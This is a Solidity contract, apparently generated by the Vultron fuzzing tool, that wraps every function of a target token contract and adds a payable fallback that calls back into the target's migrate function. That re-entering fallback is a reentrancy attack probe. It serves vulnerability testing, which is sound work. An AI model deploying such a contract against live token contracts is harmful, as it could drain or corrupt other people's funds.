pragma solidity ^0.4.19;

import "/home/osboxes/Develop/vultron/contracts/ABChainTestToken2.sol";

contract Attack_ABChainTestToken25 {

  ABChainTestToken2 public target_contract;

  function Attack_ABChainTestToken25(address _targetContract) public payable {
      target_contract = ABChainTestToken2(_targetContract);
  } 

  function vultron_approve(address _spender, uint256 _value) public {
    target_contract.approve(_spender, _value);
  } 

  function vultron_transferFrom(address _from, address _to, uint256 _value) public {
    target_contract.transferFrom(_from, _to, _value);
  } 

  function vultron_decreaseApproval(address _spender, uint256 _subtractedValue) public {
    target_contract.decreaseApproval(_spender, _subtractedValue);
  } 

  function vultron_transfer(address _to, uint256 _value) public {
    target_contract.transfer(_to, _value);
  } 

  function vultron_increaseApproval(address _spender, uint256 _addedValue) public {
    target_contract.increaseApproval(_spender, _addedValue);
  } 

  function vultron_migrate() public {
    target_contract.migrate();
  } 

  function vultron_setMigrationAgent(address _agent) public {
    target_contract.setMigrationAgent(_agent);
  } 

  function vultron_burn(uint256 _value) public {
    target_contract.burn(_value);
  } 

  function vultron_burnaftersale(uint256 _value) public {
    target_contract.burnaftersale(_value);
  } 

  function() public payable {
    target_contract.migrate();
  }
} 
